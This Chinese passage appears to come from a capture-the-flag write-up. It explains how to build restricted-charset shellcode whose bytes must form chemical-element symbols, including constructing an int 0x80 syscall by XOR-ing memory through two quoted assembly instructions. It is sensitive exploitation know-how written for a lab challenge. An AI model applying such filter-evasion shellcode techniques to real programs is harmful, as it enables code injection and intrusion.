有个难点就是我们选的地址也得是化合物形式，而本题mno2就是shellcode起始地址的加密，考虑到shellcode太长不好，我们想到N后面对应的是C，我们需要找一个“Cx”形式的化合物。我选定了Co。

其次是如何凑int 0x80(b'\xcd\x80')，我们通过下面这两句可以实现

```
19:xor    DWORD PTR [ecx],edi
11 xor    DWORD PTR [ecx],esi
```

我们不难想到，先让esi等于0x80，执行11 xor    DWORD PTR [ecx],esi，然后dec ecx 然后再xor    DWORD PTR [ecx],esi，然后esi再减至0x4d进行异或。这样是esi操作最少的方式。而且恰好在指定的地址之前完成操作。


最后就是执行到那里，使用N（dec esi），因为其对程序不会有影响。最后需要sleep(1), 我因为没加sleep多调了一个多小时/(ㄒoㄒ)/~~。

